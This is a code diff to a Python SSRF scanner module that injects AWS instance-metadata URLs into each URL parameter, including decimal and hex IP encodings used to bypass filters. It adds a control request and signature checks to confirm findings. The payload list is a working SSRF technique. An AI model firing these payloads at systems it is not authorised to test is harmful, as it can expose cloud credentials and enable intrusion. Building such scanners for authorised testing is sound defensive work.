@@ -1,50 +1,86 @@
+from urllib.parse import parse_qsl
+
 import requests
-from scanners.utils import GLOBAL_COOKIE, GLOBAL_BEARER
+
+from . import utils
+
+
+METADATA_PAYLOADS = [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://2852039166/latest/meta-data/",
+    "http://0xA9FEA9FE/latest/meta-data/",
+]
+AWS_SIGNATURES = ("ami-id", "instance-id")
+
+
+def _metadata_response(response):
+    if not response or not 200 <= response.status_code < 300:
+        return False
+    body = response.text.lower()
+    content_type = response.headers.get("Content-Type", "").lower()
+    return ("text/html" not in content_type
+            and not body.lstrip().startswith("<html")
+            and all(signature in body for signature in AWS_SIGNATURES))
+
 
 def run_cloud_ssrf_fuzzer(url):
-    """
-    Highly targeted Cloud Metadata SSRF fuzzer.
-    Injects AWS/GCP internal metadata IPs into URL parameters.
-    """
+    """Find AWS metadata SSRF with control-response and signature checks."""
     findings = []
-    headers = {}
-    if GLOBAL_COOKIE: headers["Cookie"] = GLOBAL_COOKIE
-    if GLOBAL_BEARER: headers["Authorization"] = f"Bearer {GLOBAL_BEARER}"
-
     if "?" not in url:
         return findings
-        
-    metadata_payloads = [
-        "http://169.254.169.254/latest/meta-data/",
-        "http://2852039166/latest/meta-data/", # Decimal IP bypass
-        "http://0xA9FEA9FE/latest/meta-data/"  # Hex IP bypass
-    ]
-    
-    base_url = url.split("?")[0]
-    params_str = url.split("?")[1]
-    
-    if not params_str: return findings
-    
-    params = dict(x.split('=') if '=' in x else (x, '') for x in params_str.split('&'))
-    
-    for key in params.keys():
-        for payload in metadata_payloads:
+
+    headers = {"User-Agent": "Aegis-Auto/CloudSSRF"}
+    if utils.GLOBAL_COOKIE:
+        headers["Cookie"] = utils.GLOBAL_COOKIE
+    if utils.GLOBAL_BEARER:
+        headers["Authorization"] = f"Bearer {utils.GLOBAL_BEARER}"
+
+    from urllib.parse import urlparse, urlunparse
+    parsed = urlparse(url)
+    params = parse_qsl(parsed.query, keep_blank_values=True)
+    if not params:
+        return findings
+    base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, "", parsed.fragment))
+
+    for index, (key, _original_value) in enumerate(params):
+        control_params = params.copy()
+        control_params[index] = (key, "https://example.com")
+        try:
+            control = requests.get(base_url, params=control_params, headers=headers,
+                                   timeout=5, verify=False)
+        except requests.RequestException:
+            control = None
+
+        for payload in METADATA_PAYLOADS:
             test_params = params.copy()
-            test_params[key] = payload
+            test_params[index] = (key, payload)
             try:
-                r = requests.get(base_url, params=test_params, headers=headers, timeout=5, verify=False)
-                # AWS meta-data signature
-                if "ami-id" in r.text and "instance-id" in r.text:
-                    findings.append({
-                        "type": "CLOUD_METADATA_SSRF",
-                        "url": r.url,
-                        "severity": "CRITICAL",
-                        "confidence": "HIGH",
-                        "verified": True,
-                        "detail": f"Critical Cloud SSRF! Successfully pulled AWS metadata via parameter `{key}` using payload `{payload}`. Immediate Root AWS Key compromise possible."
-                    })
-                    return findings # Immediate return to avoid spamming
-            except Exception: 
-                pass
-            
+                response = requests.get(base_url, params=test_params, headers=headers,
+                                        timeout=5, verify=False)
+            except requests.RequestException:
+                continue
+
+            if _metadata_response(response) and not _metadata_response(control):
+                findings.append({
+                    "type": "CLOUD_METADATA_SSRF",
+                    "url": response.url,
+                    "parameter": key,
+                    "severity": "CRITICAL",
+                    "confidence": "HIGH",
+                    "verified": True,
+                    "verification_method": "metadata-signature-with-control",
+                    "verification_evidence": {
+                        "deterministic": True,
+                        "provider": "AWS",
+                        "payload": payload,
+                        "status": response.status_code,
+                        "content_type": response.headers.get("Content-Type", ""),
+                        "required_signatures": list(AWS_SIGNATURES),
+                        "control_signature_absent": True,
+                    },
+                    "detail": (f"AWS metadata signatures appeared only after injecting the metadata URL "
+                               f"into parameter `{key}`."),
+                })
+                return findings
+
     return findings
